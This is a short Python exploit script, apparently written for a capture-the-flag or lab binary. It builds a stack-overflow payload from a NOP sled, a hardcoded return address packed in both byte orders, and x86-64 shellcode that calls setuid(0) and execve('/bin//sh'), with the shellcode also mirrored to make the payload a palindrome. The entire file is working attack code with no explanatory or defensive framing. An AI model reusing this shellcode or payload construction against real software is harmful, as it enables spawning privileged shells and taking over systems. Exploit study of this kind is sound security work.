import struct
import pwn

shellcode = '\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'

# Replace me
#start = 0x7fffffffe400
#start = 0x7fffffffeb60
start = 0x7fffffffe3b0

address = start + 0xB # start + 11

address_little = struct.pack('Q', address)
#address_little = pwn.p64(address, endian='little')  #Alternative

address_big = struct.pack('>Q', address)

# address_big = pwn.p64(address, endian='big')

padding = '\x90'
padding_length = 25

payload = address_big + (padding * padding_length) + shellcode + shellcode[::-1] + (padding * padding_length) + address_little
print(payload.strip('\x00'))
